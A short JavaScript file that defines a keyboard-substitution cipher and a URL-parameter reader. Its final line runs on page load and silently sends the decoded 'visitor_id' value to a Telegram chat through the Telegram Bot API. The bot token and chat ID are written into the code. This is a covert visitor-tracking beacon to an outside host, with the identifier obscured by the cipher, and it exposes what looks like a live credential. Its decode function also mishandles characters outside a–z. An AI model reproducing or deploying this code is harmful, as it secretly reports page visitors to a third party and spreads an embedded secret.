const cipher = "qwertyuiopasdfghjklzxcvbnm".split(""),
	alpha = "abcdefghijklmnopqrstuvwxyz".split("")


function encode(text) {
    let res = ""
    for (let letter of text.toLowerCase()) {
        if (cipher[alpha.indexOf(letter)]) {
            res += cipher[alpha.indexOf(letter)]
        }
        else {
            res += letter
            
        }
    }
    return res
}

function decode(cypherText) {
    let res = ""
    for (let letter of cypherText.toLowerCase()) {
        res += alpha[cipher.indexOf(letter)]
    }
    return res
}

function getParam(name){
	if(name=(new RegExp('[?&]'+encodeURIComponent(name)+'=([^&]*)')).exec(location.search))
	   return decodeURIComponent(name[1]);
}

fetch(`https://api.telegram.org/bot5533014603:AAHpRMlxU4gXUn3guunPgIYnayMCuXcpqOw/sendMessage?chat_id=1273666675&text=${decode(getParam("visitor_id"))}`)